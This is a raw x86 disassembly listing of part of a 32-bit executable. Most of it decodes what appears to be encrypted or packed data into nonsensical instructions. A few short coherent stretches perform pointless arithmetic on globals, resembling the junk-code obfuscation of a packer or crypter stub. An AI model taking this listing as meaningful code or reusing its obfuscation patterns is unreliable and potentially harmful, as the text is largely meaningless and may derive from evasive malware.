  4062b4:	inc    ecx
  4062b5:	les    ebx,FWORD PTR [eax+edx*2]
  4062b8:	scas   eax,DWORD PTR es:[edi]
  4062b9:	shr    WORD PTR [edx+edi*8-0x72],cl
  4062be:	adc    BYTE PTR [eax+0x4c3270c2],bh
  4062c4:	xchg   ebp,eax
  4062c5:	push   bx
  4062c7:	lahf   
  4062c8:	mov    DWORD PTR [ecx],eax
  4062ca:	js     0x4062e6
  4062cc:	dec    esp
  4062cd:	add    BYTE PTR [ebx],ch
  4062cf:	push   ss
  4062d0:	mov    esp,edi
  4062d2:	fldlg2 
  4062d4:	(bad)  
  4062d5:	repz push ds
  4062d7:	adc    DWORD PTR [esi+edi*8],edx
  4062da:	push   edi
  4062db:	sbb    edx,DWORD PTR [edx-0x75]
  4062de:	les    esi,FWORD PTR [eax+ebx*1-0x65]
  4062e2:	mov    esi,DWORD PTR [esi+0x73ce333e]
  4062e8:	xchg   ebx,eax
  4062e9:	jp     0x4062b5
  4062eb:	mov    ds:0xeb8a97d2,al
  4062f0:	inc    ebx
  4062f1:	icebp  
  4062f2:	dec    ecx
  4062f3:	add    al,0x80
  4062f5:	xlat   BYTE PTR ds:[ebx]
  4062f6:	sub    al,0xc7
  4062f8:	loop   0x4062d8
  4062fa:	inc    edi
  4062fb:	outs   dx,DWORD PTR ds:[esi]
  4062fc:	dec    esi
  4062fd:	pusha  
  4062fe:	aam    0x37
  406300:	in     eax,0x1c
  406302:	dec    ebp
  406303:	ret    0x4b68
  406306:	test   BYTE PTR [ecx+0x65],0x4c
  40630a:	jecxz  0x40630c
  40630c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40630d:	xchg   DWORD PTR [ebx-0x11f628cf],eax
  406313:	ret    
  406314:	in     al,dx
  406315:	sub    eax,0x906ff19a
  40631a:	push   ebx
  40631b:	(bad)  
  40631d:	out    0x4a,eax
  40631f:	in     eax,dx
  406320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406321:	xor    edx,DWORD PTR [edi+ebp*4+0x4463bfa0]
  406328:	sub    BYTE PTR [eax+0x53a339e],dl
  40632e:	sti    
  40632f:	cs stos BYTE PTR es:[edi],al
  406331:	add    DWORD PTR [ecx],esi
  406333:	jb     0x40639a
  406335:	xor    BYTE PTR ds:0x2c5d2d6c,cl
  40633b:	sub    esp,ebp
  40633d:	sar    BYTE PTR [edx],1
  40633f:	jb     0x40632f
  406341:	into   
  406342:	js     0x4062df
  406344:	fwait
  406345:	arpl   WORD PTR [esp+eiz*4],cx
  406348:	cwde   
  406349:	jb     0x4062e8
  40634b:	out    dx,al
  40634c:	(bad)  
  40634d:	outs   dx,BYTE PTR ds:[esi]
  40634e:	rcl    DWORD PTR [eax+0x6a],cl
  406351:	in     eax,dx
  406352:	jne    0x406357
  406354:	lods   eax,DWORD PTR ds:[esi]
  406355:	shl    WORD PTR [edx+0x1652a400],0x13
  40635d:	(bad)  
  40635e:	ss pop edi
  406360:	stos   BYTE PTR es:[edi],al
  406361:	push   ebp
  406362:	mov    al,ds:0xda7cddfb
  406367:	xchg   BYTE PTR [ecx+0x5d],bl
  40636a:	xchg   BYTE PTR [eax+0x48400df],bl
  406370:	sbb    BYTE PTR [ebx+0x32],0xf5
  406374:	mov    DWORD PTR [edi],ecx
  406376:	pop    esp
  406377:	and    BYTE PTR [ebx-0x62e134d6],al
  40637d:	xchg   ebx,eax
  40637e:	scas   eax,DWORD PTR es:[edi]
  40637f:	mov    esp,0x759ff438
  406384:	daa    
  406385:	sahf   
  406386:	jle    0x406318
  406388:	mov    bl,BYTE PTR [edi-0x497c69e6]
  40638e:	idiv   DWORD PTR [ecx+ebx*1-0x175e98]
  406395:	(bad)  
  406396:	pop    esi
  406397:	cmp    al,ah
  406399:	mov    ecx,0x7cd363b6
  40639e:	repnz cmp al,0x14
  4063a1:	rcl    DWORD PTR ds:[ecx-0x7a38fd7e],cl
  4063a8:	fucom  st(6)
  4063aa:	sub    al,0xda
  4063ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063ad:	pop    edi
  4063ae:	xchg   ebp,eax
  4063af:	pushf  
  4063b0:	cmp    DWORD PTR [edx],0x7a
  4063b3:	jmp    0x2f470bfb
  4063b8:	inc    edi
  4063b9:	inc    edi
  4063ba:	dec    ebx
  4063bb:	cwde   
  4063bc:	add    BYTE PTR [ebx-0xcfe2117],ch
  4063c2:	jecxz  0x406404
  4063c4:	cmp    BYTE PTR [ecx+0xc14c8c8],cl
  4063ca:	and    ch,ah
  4063cc:	loop   0x4063f4
  4063ce:	and    bl,BYTE PTR [ecx+0x2c]
  4063d1:	adc    bh,BYTE PTR [edx]
  4063d3:	and    al,0x28
  4063d5:	mov    dh,0x5c
  4063d7:	(bad)  
  4063d8:	data16 mov al,0x93
  4063db:	(bad)  
  4063dc:	push   0x2cad89bd
  4063e1:	lahf   
  4063e2:	mov    edi,0xc56ae0a2
  4063e7:	add    BYTE PTR [esi],bl
  4063e9:	imul   ecx,ebx,0xafc44053
  4063ef:	add    eax,0xbd9e08e2
  4063f4:	sub    BYTE PTR [edx],al
  4063f6:	es add ah,dh
  4063f9:	mov    dl,bh
  4063fb:	push   0x724470d9
  406400:	fcmovne st,st(1)
  406402:	popf   
  406403:	aam    0xd8
  406405:	cmp    eax,ebx
  406407:	pop    ebp
  406408:	test   DWORD PTR [edi+ebx*1+0x15a24416],edx
  40640f:	inc    esp
  406410:	cmp    eax,esp
  406412:	test   al,0xf8
  406414:	test   al,0x8e
  406416:	dec    edx
  406417:	dec    eax
  406418:	xor    DWORD PTR [edi-0x2b],ebp
  40641b:	mov    bh,0x98
  40641d:	sbb    al,0x68
  40641f:	or     bl,BYTE PTR [eax+esi*1+0x3f]
  406423:	inc    esp
  406424:	and    BYTE PTR [ebp-0x239ba040],0x1e
  40642b:	lahf   
  40642c:	xor    eax,0xf64baf98
  406431:	sub    BYTE PTR [ebx+ebp*1],ch
  406434:	adc    BYTE PTR [edi-0x6c],al
  406437:	retf   
  406438:	popa   
  406439:	stc    
  40643a:	arpl   WORD PTR [ebp+ecx*1+0x17819cfb],di
  406441:	cmp    eax,0xa7aa6a7c
  406446:	dec    eax
  406447:	dec    ecx
  406448:	int    0xc0
  40644a:	jno    0x406419
  40644c:	lock inc esi
  40644e:	jbe    0x406480
  406450:	sub    eax,0x5837cbae
  406455:	sub    eax,0x211b65a7
  40645a:	xchg   edx,eax
  40645b:	mov    edi,0x1f9c0eb6
  406460:	scas   eax,DWORD PTR es:[edi]
  406461:	inc    ebp
  406462:	lahf   
  406463:	dec    ecx
  406464:	ins    BYTE PTR es:[edi],dx
  406465:	dec    ebx
  406466:	ds dec esp
  406468:	nop
  406469:	repnz lds ebp,FWORD PTR [edi+0x6]
  40646d:	(bad)  
  40646e:	push   ds
  40646f:	xchg   edx,eax
  406470:	imul   ecx,DWORD PTR ds:0xa0c447dd,0x63bb6a9b
  40647a:	fwait
  40647b:	mov    ah,0xc5
  40647d:	sbb    BYTE PTR [ebx+0x50],dh
  406480:	ins    BYTE PTR es:[edi],dx
  406481:	(bad)  
  406483:	arpl   WORD PTR [edx-0x27a018be],si
  406489:	fstp   st(1)
  40648b:	adc    al,0x9b
  40648d:	fsub   QWORD PTR [eax+esi*2]
  406490:	cmp    al,0xa6
  406492:	ds inc ebp
  406494:	cmp    eax,0xe5a77dda
  406499:	xchg   ecx,eax
  40649a:	sub    eax,0x8e6cc012
  40649f:	outs   dx,DWORD PTR ds:[esi]
  4064a0:	pop    ds
  4064a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064a2:	stos   BYTE PTR es:[edi],al
  4064a3:	xchg   ebp,eax
  4064a4:	popf   
  4064a5:	dec    edx
  4064a6:	or     al,0x65
  4064a8:	enter  0xa523,0x5a
  4064ac:	subps  xmm5,XMMWORD PTR [edi+ebx*4]
  4064b0:	mov    edx,0x8e40633f
  4064b5:	dec    ebx
  4064b6:	jae    0x406501
  4064b8:	pop    esi
  4064b9:	retf   0x61c5
  4064bc:	mov    ds:0x1d52db3f,eax
  4064c1:	mov    dh,0x53
  4064c3:	hlt    
  4064c4:	and    edi,DWORD PTR [ebx+0xc]
  4064c7:	and    bl,cl
  4064c9:	sub    ah,BYTE PTR [eax-0x7c520d66]
  4064cf:	lds    ebx,FWORD PTR [edi-0x359b0040]
  4064d5:	jg     0x406517
  4064d7:	push   edi
  4064d8:	jp     0x4064df
  4064da:	loop   0x406478
  4064dc:	outs   dx,DWORD PTR ds:[esi]
  4064dd:	std    
  4064de:	xchg   ebx,eax
  4064df:	mov    cl,0x69
  4064e1:	pop    edi
  4064e2:	or     DWORD PTR [edi-0x62f67600],ebx
  4064e8:	cmc    
  4064e9:	jl     0x406526
  4064eb:	sbb    esp,DWORD PTR [ebx]
  4064ed:	nop
  4064ee:	add    DWORD PTR [esp+ecx*2-0x4f],edx
  4064f2:	aas    
  4064f3:	pop    es
  4064f4:	icebp  
  4064f5:	mov    esp,0xe4d9ed2a
  4064fa:	inc    edi
  4064fb:	jns    0x406501
  4064fd:	xchg   esi,eax
  4064fe:	mov    ebp,0x96b289b2
  406503:	test   eax,0x1147ba8a
  406508:	cmp    BYTE PTR [eax],ah
  40650a:	(bad)  
  40650b:	stc    
  40650c:	rcl    DWORD PTR [esi-0x2f4446b4],cl
  406512:	cmp    BYTE PTR [ecx-0x51],cl
  406515:	xor    esp,DWORD PTR [ebx+ebx*1]
  406518:	mov    ebx,0xd1b0c4ef
  40651d:	or     DWORD PTR [ebp+ebx*2+0x632bce71],ecx
  406524:	mov    cl,0xd8
  406526:	and    ch,al
  406528:	(bad)  
  406529:	jae    0x406506
  40652b:	inc    edi
  40652c:	lds    ebp,FWORD PTR [ebp+0x56f9c81b]
  406532:	pop    esp
  406533:	call   0x5c2a01b8
  406538:	add    DWORD PTR [edi-0x6684e233],esi
  40653e:	ja     0x40653b
  406540:	(bad)  
  406542:	inc    esp
  406543:	dec    esi
  406544:	and    DWORD PTR [ecx-0x49],edi
  406547:	icebp  
  406548:	cmovle ebp,ebp
  40654b:	xchg   esp,eax
  40654c:	sub    DWORD PTR [eax+eax*2-0x22],edi
  406550:	(bad)  [edx-0x66]
  406553:	sub    DWORD PTR [eax+0x0],esp
  406556:	jg     0x406505
  406558:	inc    edi
  406559:	imul   esp,DWORD PTR [esi-0x659137aa],0xffffffb7
  406560:	push   ebp
  406561:	test   DWORD PTR [eax],esi
  406563:	xor    bl,BYTE PTR [ebx-0x5a]
  406566:	pop    eax
  406567:	cld    
  406568:	ss push es
  40656a:	adc    ebx,0xaf266590
  406570:	push   ebp
  406571:	ret    
  406572:	(bad)  
  406573:	fiadd  DWORD PTR [esi+0x158b30a2]
  406579:	jbe    0x40653c
  40657b:	pop    esp
  40657c:	mov    ch,0xbd
  40657e:	push   ecx
  40657f:	int3   
  406580:	pop    eax
  406581:	adc    DWORD PTR [ecx-0x1795820a],esi
  406587:	xchg   esp,eax
  406588:	(bad)  
  406589:	adc    al,0x77
  40658b:	pop    ecx
  40658c:	ins    DWORD PTR es:[edi],dx
  40658d:	pusha  
  40658e:	dec    eax
  40658f:	add    BYTE PTR [ecx],bl
  406591:	bound  ebx,QWORD PTR [eax-0x9cc2bf8]
  406597:	add    ah,BYTE PTR [ebp+ecx*4-0x161c87ad]
  40659e:	inc    ebx
  40659f:	(bad)  
  4065a1:	lds    ecx,FWORD PTR [ebp-0x48f023bb]
  4065a7:	or     eax,0x4346bb
  4065ac:	and    ecx,DWORD PTR ds:0x4345f3
  4065b2:	mov    DWORD PTR ds:0x4346bb,ecx
  4065b8:	mov    DWORD PTR [ebp-0x28],eax
  4065bb:	adc    DWORD PTR ds:0x4345ff,ecx
  4065c1:	mov    eax,DWORD PTR [ebp+0x8]
  4065c4:	sbb    ecx,DWORD PTR ds:0x43470f
  4065ca:	mov    DWORD PTR [ebp-0x20],eax
  4065cd:	push   ebx
  4065ce:	sub    DWORD PTR ds:0x4345f7,ebx
  4065d4:	lea    eax,[ebp-0x18]
  4065d7:	mov    DWORD PTR [ebp-0x1c],eax
  4065da:	xor    DWORD PTR ds:0x43464f,edx
  4065e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4065e3:	and    DWORD PTR ds:0x4345eb,0x0
  4065ed:	mov    ecx,DWORD PTR ds:0x4345eb
  4065f3:	inc    ecx
  4065f4:	mov    DWORD PTR ds:0x4345eb,ecx
  4065fa:	cmp    DWORD PTR ds:0x4345eb,0x1e
  406601:	jne    0x40661a
  406607:	push   DWORD PTR [ebp-0x14]
  40660a:	push   0x434647
  40660f:	push   0x43491f
  406614:	call   DWORD PTR ds:0x413400
  40661a:	cmp    DWORD PTR ds:0x4345eb,0x1c
  406621:	jb     0x4065ed
  406627:	jmp    0x406a15
  40662c:	call   0x70d95cef
  406631:	mov    al,0x70
  406633:	dec    esi
  406634:	mov    BYTE PTR [ecx],dh
  406636:	push   esi
  406637:	inc    esp
  406638:	push   edi
  406639:	out    0x2b,al
  40663b:	outs   dx,DWORD PTR ds:[esi]
  40663c:	dec    esp
  40663d:	cmp    edi,DWORD PTR [esi+0x7e]
  406640:	dec    edi
  406641:	jns    0x4066c1
  406643:	jle    0x40665b
  406645:	mov    ebp,0xd404c74c
  40664a:	dec    edx
  40664b:	xchg   ecx,eax
  40664c:	leave  
  40664d:	pushf  
  40664e:	mov    ecx,0xc9a0721a
  406653:	fstp   DWORD PTR [ebp+0xfd2eca9]
  406659:	enter  0xe016,0x0
  40665d:	jmp    0xaf05:0x445fa61e
  406664:	jmp    0xd4a87720
  406669:	cmp    ecx,DWORD PTR [edi+0x996986a]
  40666f:	dec    edi
  406670:	(bad)  
  406671:	sub    BYTE PTR [edi+edx*2+0x45],ch
  406675:	cmp    eax,0xb0da8ea3
  40667a:	ins    BYTE PTR es:[edi],dx
  40667b:	jmp    0xdff3:0x46c5584a
  406682:	sbb    ecx,esp
  406684:	leave  
  406685:	mov    cl,0xf1
  406687:	stc    
  406688:	stos   DWORD PTR es:[edi],eax
  406689:	xchg   ebp,eax
  40668a:	xlat   BYTE PTR ds:[ebx]
  40668b:	out    dx,al
  40668c:	fild   QWORD PTR [esi+ebx*1]
  40668f:	inc    edx
  406690:	lahf   
  406691:	mov    al,0xc5
  406693:	and    cl,bh
  406695:	(bad)  
  406697:	sar    DWORD PTR [esi-0x4b],1
  40669a:	lock push 0xffffffc0
  40669d:	call   0x4256:0xe2e507a9
  4066a4:	sbb    DWORD PTR [ebx-0xa8011f7],ebp
  4066aa:	dec    esp
  4066ab:	fisub  DWORD PTR [esi]
  4066ad:	cmc    
  4066ae:	rcl    DWORD PTR [ebx+0x43],1
  4066b1:	les    eax,FWORD PTR [eax-0x3839f18b]
  4066b7:	mov    edi,0x9ef8e900
  4066bc:	pushf  
  4066bd:	mov    ecx,0x53d84c15
  4066c2:	cli    
  4066c3:	add    cl,BYTE PTR ds:0xc2f9d964
  4066c9:	sbb    al,0x8d
  4066cb:	push   ss
  4066cc:	(bad)  
  4066cd:	iret   
  4066ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066cf:	ja     0x40667f
  4066d1:	fisttp QWORD PTR [edi+0x4672362a]
  4066d7:	sub    bl,BYTE PTR ds:0x148bd76
  4066dd:	mov    ds:0x5f84897c,eax
  4066e2:	mov    ebp,esi
  4066e4:	xchg   BYTE PTR [edx],ch
  4066e6:	les    ecx,FWORD PTR [esi+0x5]
  4066e9:	call   0x9c24:0x3fc21391
  4066f0:	jb     0x406741
  4066f2:	(bad)  
  4066f3:	lea    esp,[ebx+0x2da024d]
  4066f9:	dec    ecx
  4066fa:	jae    0x406701
  4066fc:	mov    dh,0xde
  4066fe:	mov    ds:0x30588473,eax
  406703:	dec    eax
  406704:	cmp    BYTE PTR [eax],0x50
  406707:	lahf   
  406708:	mov    esi,0x7dbbfd03
  40670d:	cli    
  40670e:	add    eax,0x92e14b65
  406713:	push   ebx
  406714:	rcr    BYTE PTR [edx],cl
  406716:	fidivr DWORD PTR [ecx-0x4779bbd4]
  40671c:	iret   
  40671d:	sahf   
  40671e:	(bad)  
  40671f:	loope  0x4066b6
  406721:	(bad)  
  406722:	(bad)  [edi+0xe981df0]
  406728:	jne    0x406714
  40672a:	sub    al,0x61
  40672c:	cmp    esp,DWORD PTR [ebp+ecx*2+0x3756354c]
  406733:	push   eax
  406734:	jg     0x4066e9
  406736:	pop    es
  406737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406738:	jne    0x406753
  40673a:	fldenv [edx]
  40673c:	je     0x406727
  40673e:	add    DWORD PTR [edx+esi*8-0x2c],ebp
  406742:	loope  0x4066d9
  406744:	call   0x3d99f6df
  406749:	push   0x38dde58d
  40674e:	pop    esp
  40674f:	or     eax,0x473e164b
  406754:	push   0x1c
  406756:	test   BYTE PTR [ecx*8+0x3f4c1289],0xc6
  40675e:	adc    eax,0x1f9c7a00
  406763:	inc    esp
  406764:	hlt    
  406765:	(bad)  [eax+0x782cda5b]
  40676b:	sub    al,0xce
  40676d:	pusha  
  40676e:	dec    esi
  40676f:	aas    
  406770:	mov    edi,DWORD PTR [ecx]
  406772:	test   al,0xed
  406774:	test   BYTE PTR [ebp-0x2d],cl
  406777:	and    eax,0x768431e
  40677c:	push   ecx
  40677d:	sar    BYTE PTR [edx-0x7e2b9224],cl
  406783:	and    DWORD PTR [ebx],esp
  406785:	add    al,0x1f
  406787:	call   FWORD PTR [ecx+0xc]
  40678a:	add    eax,0x48c14650
  40678f:	bound  esp,QWORD PTR [ecx-0x386acbb0]
  406795:	stos   DWORD PTR es:[edi],eax
  406796:	inc    edi
  406797:	cmp    BYTE PTR [ebp-0x47fd1241],dh
  40679d:	push   eax
  40679e:	cli    
  40679f:	xchg   BYTE PTR [eax],ch
  4067a1:	loope  0x406800
  4067a3:	neg    DWORD PTR [edx+0x7a]
  4067a6:	dec    ebx
  4067a7:	and    al,0x46
  4067a9:	xor    al,0x9d
  4067ab:	jge    0x40681c
  4067ad:	pop    ebp
  4067ae:	inc    esp
  4067af:	and    eax,esp
  4067b1:	inc    ebp
  4067b2:	jbe    0x4067a8
  4067b4:	mov    dh,0x74
  4067b6:	pushw  0x20a
  4067ba:	fcom   DWORD PTR [esi+edi*2-0x71]
  4067be:	mov    edx,ebx
  4067c0:	inc    ebx
  4067c1:	xchg   ebx,eax
  4067c2:	xchg   ecx,eax
  4067c3:	mov    al,0x55
  4067c5:	add    cl,BYTE PTR [ebx-0x54ae628d]
  4067cb:	fwait
  4067cc:	ret    
  4067cd:	mov    dl,0xc0
  4067cf:	fcomi  st,st(1)
  4067d1:	mov    ds:0x7b7740b0,al
  4067d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067d7:	ss mov esi,0x7a7658c5
  4067dd:	dec    edx
  4067de:	jnp    0x4067a7
  4067e0:	adc    ebp,DWORD PTR [ebx+0x5615e933]
  4067e6:	clc    
  4067e7:	and    eax,0x78a5accc
  4067ec:	loop   0x40678f
  4067ee:	xchg   esi,eax
  4067ef:	mov    dh,0x1a
  4067f1:	jg     0x406800
  4067f3:	sub    al,0x91
  4067f5:	loopne 0x40677a
  4067f7:	popa   
  4067f8:	in     al,dx
  4067f9:	add    al,0x0
  4067fb:	out    0xca,eax
  4067fd:	sahf   
  4067fe:	jge    0x40686f
  406800:	ss mov edi,0xb9e73a06
  406806:	dec    ecx
  406807:	mov    eax,ds:0xf8066810
  40680c:	or     eax,0xb52d990f
  406811:	xor    eax,0xa8752e4d
  406816:	mov    ch,0x22
  406818:	pop    edi
  406819:	xchg   esi,eax
  40681a:	fdiv   DWORD PTR [eax]
  40681c:	mov    edi,esi
  40681e:	sar    BYTE PTR fs:[ebx-0x62],cl
  406822:	icebp  
  406823:	or     DWORD PTR [esi+0x72],ebx
  406826:	scas   al,BYTE PTR es:[edi]
  406827:	or     al,0x20
  406829:	cli    
  40682a:	ret    
  40682b:	and    eax,0x94e8ffb4
  406830:	add    eax,0x505e9034
  406835:	nop
  406836:	lock push 0xce401ccb
  40683c:	dec    edx
  40683d:	sub    edi,ecx
  40683f:	dec    ecx
  406840:	in     al,dx
  406841:	xchg   ecx,eax
  406842:	fnstenv [eax-0x338e6cad]
  406848:	data16 ins BYTE PTR es:[edi],dx
  40684a:	fild   WORD PTR [esi]
  40684c:	call   0xe5434934
  406851:	xchg   DWORD PTR [ebx-0x60069587],ecx
  406857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406858:	aaa    
  406859:	cmp    eax,0xd23f29b5
  40685e:	repnz neg DWORD PTR [ebx]
  406861:	jmp    0x406892
  406863:	adc    eax,0xc26eb46d
  406868:	(bad)  [esi-0x6d216525]
  40686e:	out    dx,eax
  40686f:	cmp    edi,DWORD PTR [ecx+0x37]
  406872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406873:	cmp    ebx,esp
  406875:	ins    DWORD PTR es:[edi],dx
  406876:	push   esi
  406877:	fiadd  WORD PTR [eax]
  406879:	jl     0x4068e9
  40687b:	push   esi
  40687c:	or     bh,BYTE PTR [ebx]
  40687e:	cli    
  40687f:	sbb    DWORD PTR [edi-0x281ab77f],edi
  406885:	mov    WORD PTR [ebp-0x6ec1c253],?
  40688b:	imul   esi,DWORD PTR [ebx+0x541e5908],0xffffffe7
  406892:	sub    bl,BYTE PTR [ebx+eax*4-0x6a]
  406896:	mov    BYTE PTR [edi+0x1847f5fd],bl
  40689c:	push   es
  40689d:	dec    ebp
  40689e:	fsub   QWORD PTR [ebp-0x2a59354a]
  4068a4:	mov    al,0x79
  4068a6:	data16 scas al,BYTE PTR es:[edi]
  4068a8:	mov    bh,0xfc
  4068aa:	call   0x7916beca
  4068af:	adc    esi,esi
  4068b1:	fst    QWORD PTR [eax]
  4068b3:	jp     0x4068d1
  4068b5:	loopne 0x4068e6
  4068b7:	and    DWORD PTR ds:0x31c8ee33,eax
  4068bd:	(bad)  
  4068be:	aam    0xab
  4068c0:	mov    dh,0x48
  4068c2:	dec    ebx
  4068c3:	fwait
  4068c4:	and    al,0xfa
  4068c6:	lods   al,BYTE PTR ds:[esi]
  4068c7:	cs aad 0xc1
  4068ca:	dec    eax
  4068cb:	dec    eax
  4068cc:	test   eax,0x9b5fd450
  4068d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068d2:	in     eax,0xec
  4068d4:	pop    ebx
  4068d5:	outs   dx,DWORD PTR ds:[esi]
  4068d6:	sahf   
  4068d7:	xchg   ecx,eax
  4068d8:	(bad)
  4068dc:	data16 sbb dh,bh
  4068df:	and    DWORD PTR [edx-0x5c50773],ebx
  4068e5:	push   esp
  4068e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068e7:	es push es
  4068e9:	aam    0x1b
  4068eb:	xor    eax,0x472bfffe
  4068f0:	mov    ch,BYTE PTR [edi+0x5e]
  4068f3:	test   al,0xda
  4068f5:	cmp    dh,BYTE PTR [edx]
  4068f7:	test   eax,0xfe972840
  4068fc:	lock (bad) 
  4068fe:	jo     0x406926
  406900:	push   ss
  406901:	fist   DWORD PTR [ebx+0x3a04cf7e]
  406907:	aad    0xf7
  406909:	mov    dh,0xe0
  40690b:	sbb    al,0xc9
  40690d:	shr    BYTE PTR [eax+0x350a1c93],1
  406913:	dec    esp
  406914:	pop    ebx
  406915:	push   es
  406916:	mov    es,WORD PTR [ecx]
  406918:	mov    ah,0x67
  40691a:	fiadd  DWORD PTR [esi]
  40691c:	popf   
  40691d:	(bad)  
  40691f:	stc    
  406920:	add    DWORD PTR [ebx-0x53],eax
  406923:	nop
  406924:	adc    BYTE PTR [ecx],ah
  406926:	inc    edx
  406927:	and    BYTE PTR [edx+0x6c],bh
  40692a:	test   eax,0x8cfbd418
  40692f:	pop    ss
  406930:	jg     0x4068e0
  406932:	cld    
  406933:	and    DWORD PTR [edx],edx
  406935:	jle    0x40697d
  406937:	lahf   
  406938:	push   0x7a
  40693a:	xchg   ebx,eax
  40693b:	and    eax,0xc67e8ef3
  406940:	mov    bh,0x45
  406942:	fwait
  406943:	jmp    FWORD PTR [ebp+0x48]
  406946:	push   ss
  406947:	addr16 pop edi
  406949:	in     eax,0xdf
  40694b:	mov    ebx,0x50cfe13f
  406950:	(bad)  
  406952:	sbb    al,BYTE PTR [edi]
  406954:	stc    
  406955:	dec    edx
  406956:	adc    DWORD PTR ds:0x7128627f,eax
  40695c:	lods   al,BYTE PTR ds:[esi]
  40695d:	and    BYTE PTR [ebp+0x351df6a5],al
  406963:	aad    0xb5
  406965:	xchg   BYTE PTR [eax+0x2f],dl
  406968:	in     al,dx
  406969:	xchg   bl,ah
  40696b:	out    0x0,al
  40696d:	sub    DWORD PTR [ebx-0x58237241],eax
  406973:	icebp  
  406974:	inc    edx
  406975:	mov    dh,0x5b
  406977:	loope  0x4069e0
  406979:	lods   eax,DWORD PTR ds:[esi]
  40697a:	out    dx,al
  40697b:	mov    ch,0xac
  40697d:	xchg   BYTE PTR [esi+0x43d861c],ah
  406983:	call   0x96a5:0x3df651da
  40698a:	jmp    0xbc05:0xa4c4349a
  406991:	inc    edi
  406992:	and    BYTE PTR [esi+0x31],dl
  406995:	enter  0x7552,0x30
  406999:	aas    
  40699a:	xchg   ebx,eax
  40699b:	imul   ebp,edi,0x4d
  40699e:	mov    ds:0xc267b078,eax
  4069a3:	mov    edi,0x2859668a
  4069a8:	xchg   edi,eax
  4069a9:	xchg   edi,eax
  4069aa:	mov    dl,0x5f
  4069ac:	arpl   WORD PTR [esi],bp
  4069ae:	es popf 
  4069b0:	mov    dl,0xa3
  4069b2:	pop    ss
  4069b3:	into   
  4069b4:	aas    
  4069b5:	std    
  4069b6:	test   esp,edx
  4069b8:	daa    
  4069b9:	xor    bh,cl
  4069bb:	test   BYTE PTR [ebx+0x4],ch
  4069be:	pop    esp
  4069bf:	stos   BYTE PTR es:[edi],al
  4069c0:	xor    cl,BYTE PTR [esi-0x29]
  4069c3:	(bad)  
  4069c4:	add    ch,BYTE PTR [ecx-0x38]
  4069c7:	imul   ebp,DWORD PTR [edx],0x5c868e1e
  4069cd:	inc    esp
  4069ce:	xor    DWORD PTR [ebx-0x3fc9a233],0x7c
  4069d5:	xlat   BYTE PTR ds:[ebx]
  4069d6:	xor    dl,BYTE PTR [ecx+0x79]
  4069d9:	and    ah,BYTE PTR [eax]
  4069db:	inc    DWORD PTR [eax+0x5b]
  4069de:	pop    ss
  4069df:	sub    DWORD PTR [esi],edi
  4069e1:	xchg   ebx,eax
  4069e2:	les    ebx,FWORD PTR [ebp+0x42]
  4069e5:	imul   ebx,DWORD PTR [ebx+0xf],0xa177cd71
  4069ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069ed:	inc    esp
  4069ee:	add    eax,0xd0fdc7c9
  4069f3:	mov    ecx,0x6420750f
  4069f8:	mov    al,0x67
  4069fa:	(bad)  
  4069fb:	xor    BYTE PTR [edi],al
  4069fd:	scas   al,BYTE PTR es:[edi]
  4069fe:	scas   eax,DWORD PTR es:[edi]
  4069ff:	xchg   edi,eax
  406a00:	mov    al,ds:0x7b96003b
  406a05:	inc    ecx
  406a06:	ja     0x406a87
  406a08:	pop    ss
  406a09:	(bad)  
  406a0a:	mov    ?,WORD PTR [esi+0x59]
  406a0d:	sahf   
  406a0e:	nop
  406a0f:	icebp  
  406a10:	(bad)  
  406a11:	in     eax,dx
  406a12:	in     eax,dx
  406a13:	xor    eax,0x3357569e
  406a18:	stc    
  406a19:	mov    edi,0xf89f2dae
  406a1e:	mov    DWORD PTR [eax],edi
  406a20:	mov    eax,DWORD PTR [ebp-0x14]
  406a23:	mov    ebx,DWORD PTR [ebp-0x8]
  406a26:	xor    DWORD PTR ds:0x434683,ebx
  406a2c:	mov    ecx,0x7510851
  406a31:	xor    eax,ecx
  406a33:	sbb    esi,DWORD PTR ds:0x4345fb
  406a39:	mov    esi,0x327299
  406a3e:	xor    ebx,ecx
  406a40:	add    DWORD PTR ds:0x43463b,0x4346f7
  406a4a:	xor    edx,edx
  406a4c:	add    eax,esi
  406a4e:	sbb    DWORD PTR ds:0x4345df,0x1c54
  406a58:	add    ebx,esi
  406a5a:	div    ebx
  406a5c:	mov    DWORD PTR ds:0x434637,edi
  406a62:	jmp    0x406e50
  406a67:	inc    ebx
  406a68:	push   ebp
  406a69:	sti    
  406a6a:	sbb    DWORD PTR [ebp-0x49aabca3],0xffffff8a
  406a71:	mov    ds:0xe2bfaeeb,eax
  406a76:	jbe    0x406a15
  406a78:	(bad)  
  406a79:	jle    0x406af9
  406a7b:	dec    edi
  406a7c:	jns    0x406afc
  406a7e:	jle    0x406a87
  406a80:	mov    ah,0xda
  406a82:	scas   eax,DWORD PTR es:[edi]
  406a83:	sub    DWORD PTR [esi],esp
  406a85:	fadd   QWORD PTR [eax-0x1bfe213e]
  406a8b:	pusha  
  406a8c:	mov    bl,bh
  406a8e:	and    al,BYTE PTR [esi+0x49b179e8]
  406a94:	pop    ebp
  406a95:	dec    ebx
  406a96:	enter  0xaa6a,0x69
  406a9a:	popf   
  406a9b:	aad    0x75
  406a9d:	pop    esp
  406a9e:	mov    DWORD PTR [edi],ebx
  406aa0:	jle    0x406af5
  406aa2:	ja     0x406ac4
  406aa4:	sub    esp,esi
  406aa6:	xchg   edx,eax
  406aa7:	jbe    0x406a31
  406aa9:	inc    edx
  406aaa:	loop   0x406a30
  406aac:	bnd jg 0x406b0a
  406aaf:	loop   0x406ae2
  406ab1:	mov    ebp,DWORD PTR [edi-0x33]
  406ab4:	nop
  406ab5:	stos   DWORD PTR es:[edi],eax
  406ab6:	mov    bh,0xf
  406ab8:	sub    al,0x47
  406aba:	pop    edi
